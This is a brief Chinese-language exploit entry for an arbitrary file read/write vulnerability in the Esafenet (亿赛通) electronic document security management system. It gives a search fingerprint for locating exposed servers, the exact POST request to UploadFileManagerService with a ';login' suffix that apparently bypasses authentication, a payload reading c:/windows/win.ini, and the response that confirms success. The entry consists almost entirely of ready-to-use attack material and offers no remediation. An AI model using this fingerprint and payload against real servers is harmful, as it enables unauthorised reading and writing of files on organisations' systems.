# 亿赛通电子文档安全管理系统UploadFileManagerService任意文件读取漏洞

亿赛通电子文档安全管理系统UploadFileManagerService ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/CDGServer3/index.jsp"`
- **请求**：`POST /CDGServer3/document/UploadFileManagerService;login HTTP/1.1`

**Payload**
```
command=ViewUploadFile&filePath=c:/windows/win.ini&fileName1=hello
```
- **响应特征**：200 support